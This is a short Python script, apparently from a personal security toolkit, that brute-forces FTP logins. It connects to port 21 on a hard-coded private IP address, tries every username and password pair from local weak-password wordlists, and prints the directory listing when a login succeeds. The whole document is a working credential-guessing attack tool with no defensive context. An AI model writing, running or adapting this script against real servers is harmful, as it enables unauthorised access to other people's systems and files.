import ftplib


def ftp_brute(ip):
    ftp = ftplib.FTP()
    ftp.connect(ip, 21)
    for username in open('E:/Sec/Tools/字典/fuzzDicts/passwordDict/ServiceWeakPass/ftp弱口令/ftp-user.txt'):
        for password in open('E:/Sec/Tools/字典/fuzzDicts/passwordDict/ServiceWeakPass/ftp弱口令/ftp-pass.txt'):
            username = username.strip()
            password = password.strip()
            # print(username + '    ' + password)
            try:
                ftp.login(username, password)
                ftp_list = ftp.retrlines('list')
                print(ftp_list)
            except Exception as e:
                pass


if __name__ == '__main__':
    ip = '192.168.110.34'
    ftp_brute(ip)
